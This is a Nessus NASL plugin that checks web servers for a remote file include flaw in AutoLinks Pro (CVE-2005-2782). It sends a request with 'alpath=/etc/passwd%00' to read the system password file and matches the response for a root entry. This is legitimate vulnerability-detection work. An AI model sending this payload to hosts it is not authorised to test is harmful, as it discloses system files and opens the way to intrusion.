#
# (C) Tenable Network Security
#



include("compat.inc");

if (description) {
  script_id(19522);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2782");
  script_bugtraq_id(14686);
  script_xref(name:"OSVDB", value:"19066");

  name["english"] = "AutoLinks Pro alpath Parameter File Include Vulnerability";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that suffers from a remote
file include flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AutoLinks Pro, a commercial link management
package. 

The version of AutoLinks Pro installed on the remote host allows
attackers to control the 'alpath' parameter used when including PHP
code in the 'al_initialize.php' script.  By leveraging this flaw, an
unauthenticated attacker is able to view arbitrary files on the remote
host and to execute arbitrary PHP code, possibly taken from third-
party hosts." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for alpath parameter file include vulnerability in AutoLinks Pro";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencie("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  r = http_send_recv3(method:"GET", port: port,
    item:string( dir, "/al_initialize.php?",
      "alpath=/etc/passwd%00"));
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but the other flaws
    #     would still be present.
    egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Failed opening .*'/etc/passwd")
  ) {
    security_warning(port);
    exit(0);
  }
}

